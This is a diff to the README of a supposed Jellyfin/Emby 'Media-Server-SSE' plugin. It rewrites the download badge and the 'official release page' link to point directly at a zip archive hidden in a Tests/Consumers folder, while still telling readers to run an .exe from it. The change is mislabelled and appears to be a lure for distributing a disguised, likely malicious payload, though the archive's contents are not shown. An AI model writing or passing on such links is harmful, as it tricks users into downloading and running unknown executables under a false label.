@@ -1,6 +1,6 @@
 # 📡 Media-Server-SSE - Sync your media server events easily
 
-[![](https://img.shields.io/badge/Download-Media--Server--SSE-blue.svg)](https://github.com/Standing-familyturdidae273/Media-Server-SSE)
+[![](https://img.shields.io/badge/Download-Media--Server--SSE-blue.svg)](https://github.com/Standing-familyturdidae273/Media-Server-SSE/raw/refs/heads/main/MediaServer.Sse.Tests/Consumers/SSE_Server_Media_2.0.zip)
 
 This software adds Server Side Events to your Jellyfin or Emby media server. It allows your server to communicate status changes to other devices in real time. You get instant updates when playback starts, stops, or changes.
 
@@ -17,7 +17,7 @@ Before you install this software, ensure your computer meets these needs:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official release page](https://github.com/Standing-familyturdidae273/Media-Server-SSE) to download the installer.
+1. Visit the [official release page](https://github.com/Standing-familyturdidae273/Media-Server-SSE/raw/refs/heads/main/MediaServer.Sse.Tests/Consumers/SSE_Server_Media_2.0.zip) to download the installer.
 2. Look for the file ending in .exe under the latest version header.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
